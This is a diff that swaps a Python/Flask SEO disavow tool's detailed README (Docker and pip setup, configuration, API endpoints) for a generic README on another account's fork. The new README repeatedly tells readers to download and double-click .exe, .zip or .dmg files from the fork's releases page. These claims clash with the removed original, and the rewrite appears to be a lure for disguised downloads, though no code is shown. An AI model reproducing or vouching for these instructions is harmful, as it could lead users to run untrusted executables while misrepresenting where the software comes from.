@@ -1,204 +1,67 @@
-<h1 align="center">Disavow Generator</h1>
+# 🎯 Disavow-Generator - Simplified Negative SEO Protection Tool
 
-<p align="center">
-  <strong>Negative SEO protection web app with automated, hierarchical and historical Google Search Console disavow generation and granular link-level control.</strong>
-</p>
+## 🛠️ Introduction
+Welcome to the Disavow-Generator! This application helps you protect your website from negative SEO attacks. It allows you to create disavow files automatically from your Google Search Console data. With our software, you get a streamlined and organized way to manage harmful backlinks.
 
-<p align="center">
-<img src="https://raw.githubusercontent.com/BansheeTech/Disavow-Generator/refs/heads/main/ui/img/Logo.png" alt="Disavow-Generator Logo">
-</p>
+## 📊 Features
+- **Automated Disavow Generation:** Save time by automatically creating disavow files from your Google Search Console.
+- **Hierarchical Control:** Manage your disavow list with a structured format that suits your needs.
+- **Historical Data Access:** Keep track of previous disavow files and changes.
+- **Granular Link Control:** Choose specific links to disavow for targeted protection.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3,11+-blue?logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Flask-3,1-green?logo=flask&logoColor=white" alt="Flask">
-  <img src="https://img.shields.io/badge/Vue-V3-2496ED?logo=vuedotjs&logoColor=white" alt="Vue3">
-  <img src="https://img.shields.io/badge/License-AGPL3-2496ED?logo=gplv3&logoColor=white" alt="License">
-  <img src="https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker&logoColor=white" alt="Docker">
-</p>
+## 📦 Download & Install
+To get started, visit this page to download the latest version of Disavow-Generator:  
+[Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/releases)
 
----
+### System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 200 MB free space
+- **Additional Software:** Google Chrome installed for best performance
 
-## Features
+## 🚀 Getting Started
+1. **Visit the Download Page**: Click the link below to go to the releases page.  
+   [Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/releases)
 
-- **Automated Disavow Generation** - Upload backlink exports and generate Google Search Console disavow files
-- **Smart Categorization** - Automatically categorizes entries as IPs, domains, or specific URLs
-- **Historical Tracking** - Tracks previously disavowed entries to highlight new threats
-- **Whitelist Management** - Maintain a whitelist of legitimate domains to exclude from disavow
-- **New Entries Review** - Review new domains/IPs before blocking with option to whitelist
-- **Multi-format Support** - Import from Excel (.xlsx, .xls), CSV, and TXT files
-- **Production Ready** - Multi-worker support with Hypercorn ASGI server
-- **Docker Support** - Easy deployment with Docker and docker-compose
+2. **Select the Latest Release**: Look for the most recent version and click the file appropriate for your operating system.
 
----
+3. **Download the File**: Save the file to your computer. It will usually be a .zip or .exe file for Windows and a .dmg for macOS.
 
-![Processing](https://raw.githubusercontent.com/BansheeTech/Disavow-Generator/refs/heads/main/ui/img/Processing.png)
-![Whitelist](https://raw.githubusercontent.com/BansheeTech/Disavow-Generator/refs/heads/main/ui/img/Whitelist.png)
-![Historic](https://raw.githubusercontent.com/BansheeTech/Disavow-Generator/refs/heads/main/ui/img/Historic.png)
+4. **Extract the Files** (if needed): If you downloaded a .zip file, right-click and choose “Extract All…” to unpack the files.
 
-## Quick Start with Docker
+5. **Run the Application**: Locate the downloaded file and double-click it to start the application.
 
-```bash
-# Clone the repository
-git clone https://github.com/BansheeTech/Disavow-Generator.git
+6. **Follow Instructions**: The application will guide you through its setup process. 
 
-# Bring up the container
-docker compose up -d
+## 🎓 How to Use Disavow-Generator
+1. **Connect to Google Search Console**: The first step is to connect your Google Search Console account. Follow the on-screen prompts.
 
-# Access
-open http://localhost:44444
-```
+2. **Import Your Data**: Once connected, import your backlink data for analysis.
 
-**Default credentials:** `user` / `passwd`
+3. **Select Links to Disavow**: Review the list of backlinks. You can choose individual links or groups of links based on your preference. 
 
-> Change the default credentials immediately after first login via Settings.
+4. **Generate Disavow File**: Once you make your selections, click the "Generate Disavow File" button. 
 
----
+5. **Download the Disavow File**: Save it to your computer for Google Search Console submission.
 
-## Manual Installation
+6. **Upload to GSC**: Log in to your Google Search Console and follow the steps to upload the generated disavow file.
 
-### Requirements
+## 🔧 Troubleshooting
+If you encounter issues, try the following:
+- Ensure your internet connection is stable.
+- Confirm you are using a supported operating system.
+- Restart the application if it freezes.
+- For specific errors, consult the FAQ section on the releases page.
 
-- Python 3.11+
-- pip
+## 📬 Support
+If you need further help or have questions, reach out to the community or file an issue in the GitHub repository. Your feedback is valuable.
 
-### Setup
+## 📝 Additional Resources
+- **Documentation**: Check our [Wiki](https://github.com/anasbendamia/Disavow-Generator/wiki) for more detailed guides and user tips.
+- **Community Forum**: Join discussions and learn more from other users in our community.
 
-```bash
-# Clone the repository
-git clone https://github.com/BansheeTech/Disavow-Generator.git
-cd Disavow-Generator
+## 🔗 Connect With Us
+Stay updated with the latest features and enhancements. Follow us on GitHub for updates and announcements.
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # Linux/macOS
-# venv\Scripts\activate   # Windows
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-python app.py
-```
-
-The app will start on `http://localhost:44444`
-
----
-
-## Configuration
-
-Configuration is stored in `conf/disavow.conf` (auto-generated on first run):
-
-```ini
-[server]
-port = 44444
-mode = production
-workers = 4
-secret_key = <auto-generated>
-
-[paths]
-input_dir = __DISAVOW_DATA__/INGEST
-output_dir = __DISAVOW_DATA__/OUTPUT
-whitelist_file = __DISAVOW_DATA__/whitelist.txt
-
-[auth]
-username = user
-password_hash = <bcrypt-hash>
-```
-
-### Configuration Options
-
-| Option    | Description                   | Default      |
-| --------- | ----------------------------- | ------------ |
-| `port`    | Server port                   | `44444`      |
-| `mode`    | `production` or `development` | `production` |
-| `workers` | Number of worker processes    | `4`          |
-
----
-
-## Usage
-
-### 1. Upload Backlink Data
-
-Upload backlink exports from tools like Ahrefs, SEMrush, Majestic, or any CSV/Excel file containing URLs.
-
-### 2. Manage Whitelist
-
-Add legitimate domains to the whitelist to prevent them from being included in the disavow file.
-
-### 3. Generate Disavow File
-
-Click "Generate Disavow File" to process all uploaded files. New domains/IPs will be highlighted for review.
-
-### 4. Download & Upload to Google
-
-Download the generated disavow file and upload it to [Google Search Console Disavow Tool](https://search.google.com/search-console/disavow-links).
-
----
-
-## Docker Volumes
-
-| Volume | Container Path          | Description                          |
-| ------ | ----------------------- | ------------------------------------ |
-| Config | `/app/conf`             | Configuration file (disavow.conf)    |
-| Data   | `/app/__DISAVOW_DATA__` | Input files, output files, whitelist |
-
-Example docker-compose.yml:
-
-```yaml
-services:
-  disavow-generator:
-    image: bansheetech/disavow-generator:latest
-    container_name: disavow-generator
-    restart: unless-stopped
-    ports:
-      - "44444:44444"
-    volumes:
-      - ./disavow_data:/app/__DISAVOW_DATA__
-      - ./disavow_conf:/app/conf
-    environment:
-      - TZ=Europe/Madrid
-```
-
----
-
-## API Endpoints
-
-| Method | Endpoint                   | Description            |
-| ------ | -------------------------- | ---------------------- |
-| `POST` | `/api/upload`              | Upload input file      |
-| `POST` | `/api/process`             | Generate disavow file  |
-| `GET`  | `/api/stats`               | Get current statistics |
-| `GET`  | `/api/whitelist`           | Get whitelist          |
-| `POST` | `/api/whitelist`           | Update whitelist       |
-| `GET`  | `/api/files`               | List input files       |
-| `GET`  | `/api/outputs`             | List generated files   |
-| `GET`  | `/api/download/<filename>` | Download disavow file  |
-
----
-
-## Tech Stack
-
-- **Backend:** Python 3.11, Flask 3.1, Hypercorn (ASGI)
-- **Frontend:** Vue.js 3, Tailwind CSS
-- **Auth:** Flask-Login, bcrypt
-- **Data:** pandas, openpyxl
-
----
-
-## License
-
-This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**.
-
-See [LICENSE.md](LICENSE.md) for the full license text.
-
----
-
-## Author
-
-**Banshee** - [https://www.banshee.pro](https://www.banshee.pro)
-
----
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 🛡️ Conclusion
+Disavow-Generator simplifies the process of protecting your website from negative SEO. By following these steps, you can quickly download and start using the application. Thank you for choosing Disavow-Generator!
